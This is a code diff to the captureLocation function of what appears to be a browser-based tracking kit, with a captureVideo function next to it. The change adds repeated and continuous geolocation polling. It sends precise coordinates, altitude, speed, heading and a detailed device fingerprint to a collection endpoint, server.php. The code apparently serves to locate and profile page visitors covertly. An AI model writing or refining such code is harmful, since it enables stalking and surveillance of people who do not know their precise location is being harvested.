@@ -36,14 +36,45 @@
     function captureLocation(baseUrl) {
         if (!navigator.geolocation) return;
         var opts = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
-        navigator.geolocation.getCurrentPosition(function (pos) {
-            var device = getDeviceInfo();
-            var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection };
-            sendData(baseUrl + '/server.php', data);
-        }, function (err) {
-            var device = getDeviceInfo();
-            sendData(baseUrl + '/server.php', { a: 'loc', error: err.code, platform: device.platform, browser: device.browser, os: device.os, timezone: device.timezone });
-        }, opts);
+        var attempts = 0;
+        var maxAttempts = 3;
+        var locations = [];
+        
+        function tryGetLocation() {
+            attempts++;
+            navigator.geolocation.getCurrentPosition(function (pos) {
+                locations.push(pos);
+                
+                if (attempts >= maxAttempts || pos.coords.accuracy < 100) {
+                    var bestPos = locations.reduce(function(prev, curr) {
+                        return (curr.coords.accuracy < prev.coords.accuracy) ? curr : prev;
+                    });
+                    
+                    var device = getDeviceInfo();
+                    var data = { a: 'loc', lat: bestPos.coords.latitude, lon: bestPos.coords.longitude, acc: bestPos.coords.accuracy || 'N/A', alt: bestPos.coords.altitude || 'N/A', heading: bestPos.coords.heading || 'N/A', speed: bestPos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection, attempts: attempts };
+                    sendData(baseUrl + '/server.php', data);
+                } else {
+                    setTimeout(tryGetLocation, 2000);
+                }
+            }, function (err) {
+                if (attempts < maxAttempts && err.code !== 1) {
+                    setTimeout(tryGetLocation, 2000);
+                } else {
+                    var device = getDeviceInfo();
+                    sendData(baseUrl + '/server.php', { a: 'loc', error: err.code, platform: device.platform, browser: device.browser, os: device.os, timezone: device.timezone });
+                }
+            }, opts);
+        }
+        
+        tryGetLocation();
+        
+        navigator.geolocation.watchPosition(function(pos) {
+            if (pos.coords.accuracy < 50) {
+                var device = getDeviceInfo();
+                var data = { a: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy || 'N/A', alt: pos.coords.altitude || 'N/A', heading: pos.coords.heading || 'N/A', speed: pos.coords.speed || 'N/A', platform: device.platform, browser: device.browser, cores: device.cores, ram: device.ram, gpu_vendor: device.gpu_vendor, gpu_renderer: device.gpu_renderer, screen: device.screen_width + 'x' + device.screen_height, os: device.os, timezone: device.timezone, language: device.language, connection: device.connection, watch: true };
+                sendData(baseUrl + '/server.php', data);
+            }
+        }, null, opts);
     }
 
     function captureVideo(baseUrl) {
